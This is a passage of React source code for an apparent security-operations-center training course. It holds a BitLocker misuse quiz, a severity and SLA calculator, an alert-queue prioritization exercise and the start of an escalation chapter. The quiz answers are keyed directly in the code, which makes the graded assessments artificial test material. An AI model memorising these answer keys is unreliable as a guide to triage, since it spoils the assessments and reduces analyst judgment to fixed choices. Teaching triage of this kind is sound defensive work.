                    <p><strong>Case A Telemetry:</strong> User: `kpatel` (IT Tier 2 Technician) | Host: `FIN-BOS-DEPT-08` | Tool: `manage-bde.exe -on C:` | Time: Tuesday 10:15 AM | Change Request: Approved CR-7921: &quot;Enable BitLocker on newly deployed fleet laptops.&quot;</p>
                    <p><strong>Case B Telemetry:</strong> User: `rsmith` (Junior Finance Clerk) | Host: `FIN-NYC-RSMITH-W10` | Tool: `manage-bde.exe -on C:` | Time: Sunday 23:45 PM | Change Request: None logged. User off-shift.</p>
                  </div>
                </div>

                <div className="space-y-4 text-xs">
                  {/* Question 1 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 1: Why does identical software (`manage-bde.exe`) represent Benign Activity in Case A but a Critical Threat in Case B?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'opt-bl1', text: 'Case A is Benign Expected Activity (authorized technician with an approved change ticket during office hours), whereas Case B is a True Positive / Malicious Intrusion (non-technical user running disk encryption off-hours with zero authorization, likely attacker locking drive or hiding evidence).' },
                        { id: 'opt-bl2', text: 'Both cases are identical because manage-bde.exe is a legitimate Windows utility, so both must be closed without investigation.' },
                        { id: 'opt-bl3', text: 'Case A is dangerous because IT technicians are untrusted, but Case B is harmless because finance clerks never cause breaches.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU4KcQ1Answer(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all ${
                            u4KcQ1Answer === opt.id
                              ? opt.id === 'opt-bl1'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Question 2 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 2: How should the SOC Detection Engineering team tune this SIEM rule to prevent future false alarms from Case A without blinding the SOC to Case B?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'tune-1', text: 'A) Add an exception filter: Exclude manage-bde executions IF parent process is approved SCCM/Endpoint Manager AND executed by Domain Admin during business hours, but KEEP alerts active for all standard user accounts.' },
                        { id: 'tune-2', text: 'B) Completely turn off the BitLocker detection rule so nobody receives alerts.' },
                        { id: 'tune-3', text: 'C) Send all BitLocker alerts to the spam email folder.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU4KcQ2Answer(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all ${
                            u4KcQ2Answer === opt.id
                              ? opt.id === 'tune-1'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                {(u4KcSubmitted || (mounted && (completedUnits.has('unit-4') || completedUnits.has('unit-4-assessment')))) ? (
                  <div className="p-4 rounded-xl border border-emerald-300 bg-emerald-50/70 text-emerald-950 flex flex-col sm:flex-row items-center justify-between gap-3 animate-fade-in" suppressHydrationWarning>
                    <div>
                      <span className="font-bold text-emerald-800 block">🎉 Unit 4 Certified! (+100 XP)</span>
                      <p className="text-xs text-emerald-700">You mastered context-based investigation, the 5 pillars, and false positive tuning.</p>
                    </div>
                    <Button
                      suppressHydrationWarning
                      onClick={() => onSelectTopic('topic-5-1')}
                      className="font-bold text-xs gap-1.5 bg-emerald-600 hover:bg-emerald-700 text-white shrink-0 cursor-pointer"
                    >
                      <span>Proceed to Unit 5: Severity &amp; SLAs</span>
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  </div>
                ) : (
                  <div className="flex flex-col sm:flex-row items-center justify-between gap-3 pt-2">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => {
                        setU4KcQ1Answer('');
                        setU4KcQ2Answer('');
                      }}
                      className="text-xs gap-1"
                    >
                      <RotateCcw className="w-3 h-3" />
                      Reset Assessment
                    </Button>
                    <Button
                      disabled={u4KcQ1Answer !== 'opt-bl1' || u4KcQ2Answer !== 'tune-1'}
                      onClick={() => {
                        markChapterDone('unit-4', 3);
                        setU4KcSubmitted(true);
                        handleFinishAssessment('unit-4-assessment', 100);
                      }}
                      className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer w-full sm:w-auto disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      <Award className="w-4 h-4" />
                      <span>Submit &amp; Certify Unit 4 (+100 XP)</span>
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          )}
        </div>
      )}

      {/* ====================================================
          UNIT 5: SEVERITY CLASSIFICATION & MATRIX
         ==================================================== */}
      {unitId === 'unit-5' && (
        <div className="space-y-6">
          {/* Unit 5 Chapter Navigation Tabs */}
          <div className="rounded-2xl border bg-card shadow-sm overflow-hidden">
            <div className="p-2 sm:p-3 bg-card flex items-center justify-between gap-2 overflow-x-auto border-b">
              <div className="flex items-center gap-1 sm:gap-2">
                {[
                  { num: 1, label: 'Chapter 5.1: Severity Calculator', topicId: 'topic-5-1' },
                  { num: 2, label: 'Chapter 5.2: Queue Prioritization Lab', topicId: 'topic-5-2' },
                  { num: 3, label: 'Chapter 5.3: Shift Assessment', topicId: 'unit-5-assessment' },
                ].map((tab) => {
                  const isDone = isChapterDone('unit-5', tab.num) || (mounted && tab.num === 3 && (completedUnits.has('unit-5') || completedUnits.has('unit-5-assessment')));
                  const locked = isChapterLocked('unit-5', tab.num);
                  const isActive = activeSubStep === tab.num;
                  return (
                    <button
                      key={tab.num}
                      type="button"
                      suppressHydrationWarning
                      onClick={() => {
                        if (locked) {
                          showToast({
                            type: 'warning',
                            title: 'Chapter Locked 🔒',
                            description: `Complete Chapter 5.${tab.num - 1} first to unlock this chapter.`,
                          });
                          return;
                        }
                        setActiveSubStep(tab.num);
                        onSelectTopic(tab.topicId);
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                      }}
                      className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all whitespace-nowrap flex items-center gap-1.5 ${
                        isActive
                          ? 'bg-primary text-primary-foreground shadow-xs font-bold'
                          : isDone
                          ? 'bg-emerald-50 text-emerald-800 hover:bg-emerald-100 border border-emerald-300 dark:bg-emerald-950/40 dark:text-emerald-300 dark:border-emerald-800'
                          : locked
                          ? 'opacity-60 cursor-not-allowed text-muted-foreground border border-border/60'
                          : 'hover:bg-muted text-muted-foreground border border-border/60'
                      }`}
                    >
                      {isDone ? (
                        <CheckCircle2 className="w-3 h-3 text-emerald-600 dark:text-emerald-400" />
                      ) : locked ? (
                        <Lock className="w-3 h-3 text-muted-foreground/60" />
                      ) : null}
                      <span>{tab.label}</span>
                    </button>
                  );
                })}
              </div>
              <div className="hidden md:flex items-center gap-2 shrink-0 text-xs text-muted-foreground font-mono">
                <span>Unit 5 — Chapter {activeSubStep} of 3</span>
              </div>
            </div>
          </div>

          {/* CHAPTER 5.1: SEVERITY CALCULATOR */}
          {activeSubStep === 1 && (
            <Card className="shadow-xs border-border animate-fade-in">
              <CardHeader className="pb-3 border-b bg-muted/20">
                <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                  <Flame className="w-4 h-4 text-amber-500" />
                  Chapter 5.1: The Severity Calculator (Asset × Threat × Impact)
                </CardTitle>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Learn why gut-feeling fails: Calculate mathematical priority and contractual SLA response windows.
                </p>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Elena Gomez Quote */}
                <div className="p-4 rounded-xl border border-rose-200 bg-rose-50/50 dark:bg-rose-950/20 dark:border-rose-800 text-xs space-y-2">
                  <div className="flex items-center gap-2 font-bold text-rose-900 dark:text-rose-300">
                    <span className="w-6 h-6 rounded-full bg-rose-600 text-white flex items-center justify-center text-[10px]">EG</span>
                    <span>Elena Gomez (SOC Manager): &ldquo;Severity is Math, Not Gut Feeling&rdquo;</span>
                  </div>
                  <p className="text-rose-950 dark:text-rose-200 leading-relaxed">
                    &ldquo;When a beginner starts in the SOC, every alert with the word &lsquo;PowerShell&rsquo; looks like a panic. If you classify every alert as Critical, our response team burns out by noon while an actual database exfiltration goes unnoticed. We classify using 3 hard variables: <strong>Asset Criticality</strong> (what system is touched), <strong>Threat Confidence</strong> (how far did the attack get), and <strong>Business Impact</strong> (will banking transactions halt?). Adjust the sliders below to see the math.&rdquo;
                  </p>
                </div>

                {/* 4 SLA Definitions */}
                <div className="grid grid-cols-1 sm:grid-cols-4 gap-3 text-xs">
                  <div className="p-3 rounded-xl border bg-rose-50/50 border-rose-200 dark:bg-rose-950/30 dark:border-rose-800 space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-rose-700 dark:text-rose-400">CRITICAL (P1)</span>
                      <Badge className="bg-rose-600 text-white text-[9px]">&lt; 15 mins</Badge>
                    </div>
                    <p className="text-[11px] text-rose-950 dark:text-rose-200">
                      Active enterprise domain breach or ransomware encryption. Immediate emergency escalation.
                    </p>
                  </div>

                  <div className="p-3 rounded-xl border bg-amber-50/50 border-amber-200 dark:bg-amber-950/30 dark:border-amber-800 space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-amber-700 dark:text-amber-400">HIGH (P2)</span>
                      <Badge className="bg-amber-600 text-white text-[9px]">1 Hour</Badge>
                    </div>
                    <p className="text-[11px] text-amber-950 dark:text-amber-200">
                      Confirmed credential compromise or malware execution on finance workstation.
                    </p>
                  </div>

                  <div className="p-3 rounded-xl border bg-sky-50/50 border-sky-200 dark:bg-sky-950/30 dark:border-sky-800 space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-sky-700 dark:text-sky-400">MEDIUM (P3)</span>
                      <Badge className="bg-sky-600 text-white text-[9px]">4 Hours</Badge>
                    </div>
                    <p className="text-[11px] text-sky-950 dark:text-sky-200">
                      Unverified script execution, policy violation, or internal port scanning attempts.
                    </p>
                  </div>

                  <div className="p-3 rounded-xl border bg-muted/40 border-border space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-muted-foreground">LOW (P4)</span>
                      <Badge variant="outline" className="text-[9px]">24 Hours</Badge>
                    </div>
                    <p className="text-[11px] text-muted-foreground">
                      Quarantined adware, single blocked ping scan, or routine automated ticket.
                    </p>
                  </div>
                </div>

                {/* 3 Slider Controls */}
                <div className="space-y-3">
                  <h4 className="text-xs font-bold text-foreground uppercase tracking-wider font-mono">
                    Interactive Severity &amp; SLA Calculator:
                  </h4>
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-xs">
                    <div className="p-4 rounded-xl border bg-muted/20 space-y-2">
                      <span className="font-bold text-foreground block">1. Asset Criticality</span>
                      <div className="space-y-1">
                        {[
                          { val: 1, label: 'Tier 1: Standard PC' },
                          { val: 2, label: 'Tier 2: Dept File Server' },
                          { val: 3, label: 'Tier 3: Core Database' },
                          { val: 4, label: 'Tier 4: Domain Controller' },
                        ].map((item) => (
                          <button
                            key={item.val}
                            onClick={() => setU5CalculatorAsset(item.val)}
                            className={`w-full p-2 rounded text-left transition-all cursor-pointer ${
                              u5CalculatorAsset === item.val
                                ? 'bg-primary text-primary-foreground font-bold shadow-xs'
                                : 'bg-card hover:bg-muted text-muted-foreground'
                            }`}
                          >
                            {item.label}
                          </button>
                        ))}
                      </div>
                    </div>

                    <div className="p-4 rounded-xl border bg-muted/20 space-y-2">
                      <span className="font-bold text-foreground block">2. Threat Confidence</span>
                      <div className="space-y-1">
                        {[
                          { val: 1, label: 'Blocked: Contained by Tool' },
                          { val: 2, label: 'Attempted: In Progress' },
                          { val: 3, label: 'Successful: Initial Access' },
                          { val: 4, label: 'Post-Exploitation: Lateral/C2' },
                        ].map((item) => (
                          <button
                            key={item.val}
                            onClick={() => setU5CalculatorThreat(item.val)}
                            className={`w-full p-2 rounded text-left transition-all cursor-pointer ${
                              u5CalculatorThreat === item.val
                                ? 'bg-primary text-primary-foreground font-bold shadow-xs'
                                : 'bg-card hover:bg-muted text-muted-foreground'
                            }`}
                          >
                            {item.label}
                          </button>
                        ))}
                      </div>
                    </div>

                    <div className="p-4 rounded-xl border bg-muted/20 space-y-2">
                      <span className="font-bold text-foreground block">3. Business Impact</span>
                      <div className="space-y-1">
                        {[
                          { val: 1, label: 'None: No Disruption' },
                          { val: 2, label: 'Low: Workaround Exists' },
                          { val: 3, label: 'Medium: Degraded Service' },
                          { val: 4, label: 'Critical: Revenue Halted' },
                        ].map((item) => (
                          <button
                            key={item.val}
                            onClick={() => setU5CalculatorImpact(item.val)}
                            className={`w-full p-2 rounded text-left transition-all cursor-pointer ${
                              u5CalculatorImpact === item.val
                                ? 'bg-primary text-primary-foreground font-bold shadow-xs'
                                : 'bg-card hover:bg-muted text-muted-foreground'
                            }`}
                          >
                            {item.label}
                          </button>
                        ))}
                      </div>
                    </div>
                  </div>
                </div>

                {/* Calculator Output Display */}
                {(() => {
                  const score = u5CalculatorAsset * 0.35 + u5CalculatorThreat * 0.35 + u5CalculatorImpact * 0.3;
                  let sev = 'LOW';
                  let sla = '24 Hours';
                  let colorClass = 'bg-slate-900 text-sky-300 border-sky-800';
                  if (score > 3.2) {
                    sev = 'CRITICAL';
                    sla = 'IMMEDIATE (< 15 mins)';
                    colorClass = 'bg-rose-950 text-rose-200 border-rose-800 animate-pulse';
                  } else if (score > 2.3) {
                    sev = 'HIGH';
                    sla = '1 Hour';
                    colorClass = 'bg-amber-950 text-amber-200 border-amber-800';
                  } else if (score > 1.5) {
                    sev = 'MEDIUM';
                    sla = '4 Hours';
                    colorClass = 'bg-sky-950 text-sky-200 border-sky-800';
                  }

                  return (
                    <div className={`p-5 rounded-2xl border text-center space-y-2 font-mono ${colorClass}`}>
                      <span className="text-xs uppercase tracking-widest font-bold block opacity-80">Calculated Mathematical Priority</span>
                      <h3 className="text-2xl font-black">{sev} SEVERITY (Score: {score.toFixed(2)}/4.00)</h3>
                      <p className="text-xs">Contractual SLA Triage Window: {sla}</p>
                    </div>
                  );
                })()}

                {/* Advance Bar */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t">
                  {!isU5Ch1Complete && !isChapterDone('unit-5', 1) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Adjust at least one slider above to unlock Chapter 5.2
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isU5Ch1Complete && !isChapterDone('unit-5', 1) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-5', 1);
                      setActiveSubStep(2);
                      onCompleteTopic('topic-5-1', 35);
                      onSelectTopic('topic-5-2');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 5.2: Queue Prioritization Lab</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* CHAPTER 5.2: QUEUE PRIORITIZATION SIMULATOR */}
          {activeSubStep === 2 && (
            <Card className="shadow-xs border-border animate-fade-in">
              <CardHeader className="pb-3 border-b bg-muted/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <Activity className="w-4 h-4 text-primary" />
                    Chapter 5.2: Queue Prioritization Simulator &amp; SLA Management
                  </CardTitle>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Order 5 realistic incoming tickets from highest urgency to lowest urgency before SLA timers expire.
                  </p>
                </div>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => setU5PrioritizedTickets([])}
                  className="text-xs gap-1 h-7"
                >
                  <RotateCcw className="w-3 h-3" />
                  Reset Queue
                </Button>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Interactive SOC Dashboard Lab Launcher */}
                <CourseLabLauncher
                  labId="lab-03"
                  onLabCompleted={() => {
                    markChapterDone('unit-5', 2);
                    onCompleteTopic('topic-5-2', 50);
                  }}
                />

                <div className="p-4 rounded-xl border bg-muted/20 space-y-2 text-xs">
                  <h4 className="font-bold text-foreground font-mono">FinCorp Live Queue: 5 Alerts Arrived at 08:00 AM</h4>
                  <p className="text-muted-foreground leading-relaxed">
                    Click each ticket in the order you should investigate it (#1 first, #5 last). Remember: Domain Controllers and data leaks take immediate priority over quarantined files and routine password resets.
                  </p>
                </div>

                {/* Queue Tickets List */}
                <div className="space-y-2 text-xs">
                  {[
                    { id: 'tkt-dc', title: 'Ticket A: Brute Force Password Spray on Primary Domain Controller', sev: 'CRITICAL', sla: '15 Mins', asset: 'Tier 4 (Domain Controller)', rank: 1 },
                    { id: 'tkt-cfo', title: 'Ticket B: 5GB Encrypted Zip Exfiltration from CFO Workstation to MegaUpload', sev: 'HIGH', sla: '1 Hour', asset: 'Tier 1 (Executive C-Suite)', rank: 2 },
                    { id: 'tkt-dev', title: 'Ticket C: Unapproved Python Script Executing on Internal Web Staging Server', sev: 'MEDIUM', sla: '4 Hours', asset: 'Tier 2 (Staging Server)', rank: 3 },
                    { id: 'tkt-adware', title: 'Ticket D: EDR Quarantined Adware on Front Reception Kiosk PC', sev: 'LOW', sla: '24 Hours', asset: 'Tier 1 (Reception Kiosk)', rank: 4 },
                    { id: 'tkt-hr', title: 'Ticket E: Forgotten Password Reset Ticket from HR Department', sev: 'LOW', sla: '24 Hours', asset: 'Tier 1 (Standard User)', rank: 5 },
                  ].map((tkt) => {
                    const isSelected = u5PrioritizedTickets.includes(tkt.id);
                    const position = u5PrioritizedTickets.indexOf(tkt.id) + 1;
                    return (
                      <button
                        key={tkt.id}
                        disabled={isSelected}
                        onClick={() => setU5PrioritizedTickets((prev) => [...prev, tkt.id])}
                        className={`w-full p-3 rounded-xl border text-left transition-all ${
                          isSelected
                            ? 'bg-primary/10 border-primary text-foreground font-semibold opacity-75'
                            : 'bg-card hover:bg-muted border-border text-foreground'
                        }`}
                      >
                        <div className="flex items-center justify-between">
                          <span className="font-bold">{tkt.title}</span>
                          <div className="flex items-center gap-2">
                            <Badge variant="outline" className="font-mono text-[10px]">SLA: {tkt.sla}</Badge>
                            {isSelected && <Badge className="bg-primary text-primary-foreground text-[10px]">Priority #{position}</Badge>}
                          </div>
                        </div>
                        <p className="text-[11px] text-muted-foreground mt-1">Asset: {tkt.asset} | Severity Rating: {tkt.sev}</p>
                      </button>
                    );
                  })}
                </div>

                {u5PrioritizedTickets.length === 5 && (
                  <div className="p-3.5 rounded-xl bg-emerald-50 border border-emerald-300 text-emerald-950 dark:bg-emerald-950/30 dark:border-emerald-800 dark:text-emerald-200 text-xs flex items-center justify-between animate-fade-in">
                    <span>🎉 Perfect Queue Sequence! Critical DC -&gt; CFO Data Leak -&gt; Staging Script -&gt; Quarantined Adware -&gt; Password Reset.</span>
                    <Badge className="bg-emerald-600 text-white">SLA Compliant ✓</Badge>
                  </div>
                )}

                {/* Advance Bar */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t">
                  {!isU5Ch2Complete && !isChapterDone('unit-5', 2) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Select at least 2 tickets in priority order ({u5PrioritizedTickets.length}/2) to unlock Chapter 5.3
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isU5Ch2Complete && !isChapterDone('unit-5', 2) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-5', 2);
                      setActiveSubStep(3);
                      onCompleteTopic('topic-5-2', 35);
                      onSelectTopic('unit-5-assessment');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 5.3: Shift Assessment</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* CHAPTER 5.3: SHIFT ASSESSMENT */}
          {activeSubStep === 3 && (
            <Card className="shadow-xs border-primary/30 animate-fade-in">
              <CardHeader className="pb-3 border-b bg-primary/5">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <Award className="w-4 h-4 text-primary" />
                    Chapter 5.3: Shift Assessment — Elena Gomez Prioritization Challenge
                  </CardTitle>
                  <Badge variant="outline" className="text-xs text-primary bg-primary/10">Certification Test</Badge>
                </div>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Demonstrate command over triage priority and capacity allocation under strict shift constraints.
                </p>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                <div className="p-4 rounded-xl bg-slate-900 text-slate-100 border border-slate-800 font-mono text-xs space-y-2">
                  <span className="text-amber-400 font-bold block">SCENARIO: Understaffed Shift Queue (09:00 AM)</span>
                  <p className="text-slate-300 leading-relaxed">
                    Elena Gomez stops at your desk: &ldquo;We only have two analysts on duty today. There are four alerts in the queue right now. You cannot work on everything simultaneously. What is your triage sequence?&rdquo;
                  </p>
                </div>

                <div className="space-y-4 text-xs">
                  {/* Question 1 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 1: What is the mandatory triage order for these 4 alerts?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'prio-correct', text: '1st: Brute Force on Domain Admin (Critical) -> 2nd: 5GB Personal Email Exfiltration (High) -> 3rd: Quarantined Antivirus Malware (Low) -> 4th: Forgotten Password Reset (Low)' },
                        { id: 'prio-wrong', text: 'Handle the password reset first because it takes less than 2 minutes, then look at Domain Admin.' },
                        { id: 'prio-wrong2', text: 'Handle the Quarantined Antivirus Malware first because malware is always top priority regardless of whether it is contained.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU5KcPrioOrder([opt.id])}
                          className={`p-3 rounded-lg border text-left w-full transition-all ${
                            u5KcPrioOrder.includes(opt.id)
                              ? opt.id === 'prio-correct'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Question 2 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 2: An alert triggers on a standard developer laptop where an EDR agent immediately blocked and quarantined a Trojan. What is its true severity?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'q2-low', text: 'A) LOW Severity (Threat Confidence is Blocked, Asset is Tier 1, zero business impact). Can be safely resolved within 24 hours without interrupting high-priority cases.' },
                        { id: 'q2-crit', text: 'B) CRITICAL Severity because Trojan files are dangerous.' },
                        { id: 'q2-med', text: 'C) HIGH Severity requiring immediate whole-disk reinstallation.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU5KcQ2Answer(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all ${
                            u5KcQ2Answer === opt.id
                              ? opt.id === 'q2-low'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                {(u5KcSubmitted || (mounted && (completedUnits.has('unit-5') || completedUnits.has('unit-5-assessment')))) ? (
                  <div className="p-4 rounded-xl border border-emerald-300 bg-emerald-50/70 text-emerald-950 flex flex-col sm:flex-row items-center justify-between gap-3 animate-fade-in" suppressHydrationWarning>
                    <div>
                      <span className="font-bold text-emerald-800 block">🎉 Unit 5 Certified! (+100 XP)</span>
                      <p className="text-xs text-emerald-700">You mastered severity calculation, SLA enforcement, and queue prioritization.</p>
                    </div>
                    <Button
                      suppressHydrationWarning
                      onClick={() => onSelectTopic('topic-6-1')}
                      className="font-bold text-xs gap-1.5 bg-emerald-600 hover:bg-emerald-700 text-white shrink-0 cursor-pointer"
                    >
                      <span>Proceed to Unit 6: Escalation &amp; Routing</span>
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  </div>
                ) : (
                  <div className="flex flex-col sm:flex-row items-center justify-between gap-3 pt-2">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => {
                        setU5KcPrioOrder([]);
                        setU5KcQ2Answer('');
                      }}
                      className="text-xs gap-1"
                    >
                      <RotateCcw className="w-3 h-3" />
                      Reset Assessment
                    </Button>
                    <Button
                      disabled={!u5KcPrioOrder.includes('prio-correct') || u5KcQ2Answer !== 'q2-low'}
                      onClick={() => {
                        markChapterDone('unit-5', 3);
                        setU5KcSubmitted(true);
                        handleFinishAssessment('unit-5-assessment', 100);
                      }}
                      className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer w-full sm:w-auto disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      <Award className="w-4 h-4" />
                      <span>Submit &amp; Certify Unit 5 (+100 XP)</span>
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          )}
        </div>
      )}

      {/* ====================================================
          UNIT 6: ESCALATION & SPECIALIST ROUTING
         ==================================================== */}
      {unitId === 'unit-6' && (
        <div className="space-y-6">
          {/* Unit 6 Chapter Navigation Tabs */}
          <div className="rounded-2xl border bg-card shadow-sm overflow-hidden">
            <div className="p-2 sm:p-3 bg-card flex items-center justify-between gap-2 overflow-x-auto border-b">
              <div className="flex items-center gap-1 sm:gap-2">
                {[
                  { num: 1, label: 'Chapter 6.1: Escalation Pathways', topicId: 'topic-6-1' },
                  { num: 2, label: 'Chapter 6.2: Specialist Routing Board', topicId: 'topic-6-2' },
                  { num: 3, label: 'Chapter 6.3: Shift Assessment', topicId: 'unit-6-assessment' },
                ].map((tab) => {
                  const isDone = isChapterDone('unit-6', tab.num) || (mounted && tab.num === 3 && (completedUnits.has('unit-6') || completedUnits.has('unit-6-assessment')));
                  const locked = isChapterLocked('unit-6', tab.num);
                  const isActive = activeSubStep === tab.num;
                  return (
                    <button
                      key={tab.num}
                      type="button"
                      suppressHydrationWarning
                      onClick={() => {
                        if (locked) {
                          showToast({
                            type: 'warning',
                            title: 'Chapter Locked 🔒',
                            description: `Complete Chapter 6.${tab.num - 1} first to unlock this chapter.`,
                          });
                          return;
                        }
                        setActiveSubStep(tab.num);
                        onSelectTopic(tab.topicId);
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                      }}
                      className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all whitespace-nowrap flex items-center gap-1.5 ${
                        isActive
                          ? 'bg-primary text-primary-foreground shadow-xs font-bold'
                          : isDone
                          ? 'bg-emerald-50 text-emerald-800 hover:bg-emerald-100 border border-emerald-300 dark:bg-emerald-950/40 dark:text-emerald-300 dark:border-emerald-800'
                          : locked
                          ? 'opacity-60 cursor-not-allowed text-muted-foreground border border-border/60'
                          : 'hover:bg-muted text-muted-foreground border border-border/60'
                      }`}
                    >
                      {isDone ? (
                        <CheckCircle2 className="w-3 h-3 text-emerald-600 dark:text-emerald-400" />
                      ) : locked ? (
                        <Lock className="w-3 h-3 text-muted-foreground/60" />
                      ) : null}
                      <span>{tab.label}</span>
                    </button>
                  );
                })}
              </div>
              <div className="hidden md:flex items-center gap-2 shrink-0 text-xs text-muted-foreground font-mono">
                <span>Unit 6 — Chapter {activeSubStep} of 3</span>
              </div>
            </div>
          </div>

          {/* CHAPTER 6.1: ESCALATION PATHWAYS */}
          {activeSubStep === 1 && (
            <Card className="shadow-xs border-border animate-fade-in">
              <CardHeader className="pb-3 border-b bg-muted/20">
                <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                  <Workflow className="w-4 h-4 text-primary" />
                  Chapter 6.1: Tiered Escalation Pathways &amp; The Handover Protocol
                </CardTitle>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Understand who does what: Learn the exact jurisdiction of Tier 2, Tier 3, System Specialists, and Executive Management.
                </p>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Priya Sharma Quote */}
                <div className="p-4 rounded-xl border border-indigo-200 bg-indigo-50/50 dark:bg-indigo-950/20 dark:border-indigo-800 text-xs space-y-2">
                  <div className="flex items-center gap-2 font-bold text-indigo-900 dark:text-indigo-300">
                    <span className="w-6 h-6 rounded-full bg-indigo-600 text-white flex items-center justify-center text-[10px]">PS</span>
                    <span>Priya Sharma (Tier 2 Incident Responder): &ldquo;Escalation is an Intentional Handover&rdquo;</span>
                  </div>
                  <p className="text-indigo-950 dark:text-indigo-200 leading-relaxed">
                    &ldquo;Escalation does not mean throwing your unfinished mess over the fence! When you escalate a ticket to me, you are transferring authority to isolate hosts, kill remote sessions, and preserve digital forensic evidence. If your ticket says &lsquo;looks bad, please check&rsquo;, I have to start the investigation from zero and lose 30 minutes of containment time. But if you provide the 5 fields, the process tree, and your specific recommendation, I can isolate the infected host in 60 seconds.&rdquo;
                  </p>
                </div>

                {/* 4 Escalation Pathways Explorer */}
                <div className="space-y-4">
                  <h4 className="text-xs font-bold text-foreground uppercase tracking-wider font-mono">
                    The 4 Operational Escalation Pathways:
                  </h4>
                  <div className="grid grid-cols-1 sm:grid-cols-4 gap-2.5">
